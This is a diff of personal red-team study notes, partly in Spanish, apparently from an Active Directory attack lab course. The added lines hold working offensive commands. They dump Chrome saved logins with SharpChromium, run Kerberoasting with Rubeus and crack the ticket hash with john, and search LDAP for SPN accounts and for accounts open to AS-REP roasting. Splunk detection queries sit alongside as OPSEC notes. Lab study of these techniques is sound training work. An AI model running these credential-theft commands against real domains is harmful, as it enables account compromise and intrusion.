@@ -550,7 +550,7 @@ jump psexec64 srv-2 smb
 jobs
 jobkill 1
 
-#OPSCE
+#OPSEC
 source = "XmlWinEventLog: Microsoft-Windows-Sysmon / Operational" EventID = 6 Signature! = "Amazon Web Services, Inc."
 
 #FORCE NTLM
@@ -571,11 +571,35 @@ mimikatz vault::list
 mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\9D54C839752B38B233E5D56FDD7891A7
 ···incompleto
 
+#GoogleChrome
+ls C:\Users\bfarmer\AppData\Local\Google\Chrome\User Data\Default
+execute-assembly C:\Tools\SharpChromium\bin\Debug\SharpChromium.exe logins
 
+#Kerberos
+mensaje AS-REQ al Centro de distribución de claves (KDC), también conocido como Controlador de dominio, solicitando un TGT
+el KDC verifica le devuelve el TGT en AS-REP ENCRIPTADO CON LA CABLE del KDC
+luego solicita un TGS tgs -req
+el KDC se lo devuelve TGS-REP
 
+#Kerberoasting
+SPN se utilizan con Kerberos para asociar una instancia de servicio con una cuenta de inicio de sesión y se configuran en el objeto de usuario en AD
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe kerberoast /simple /nowrap
 
+#opsec-6
+señuelo y pillado 
+source = "WinEventLog: Security" EventCode = 4769
+source = "WinEventLog: Security" EventCode = 4769 Service_Name = "svc_honey"
+mejor
+execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(sAMAccountType=805306368)(servicePrincipalName=*))"
+MATCH (u:User {hasspn:true}) RETURN u
+MATCH (u:User {hasspn:true}), (c:Computer), p=shortestPath((u)-[*1..]->(c)) RETURN p
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe kerberoast /user:svc_mssql /nowrap
+john --format=krb5tgs --wordlist=wordlist svc_mssql
+$krb5tgs$23$*svc_mssql$dev.cyberbotic.io*$6A9E[blah]
 
-
+#ASREPROasting
+execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(sAMAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname
+ 
 
 
 
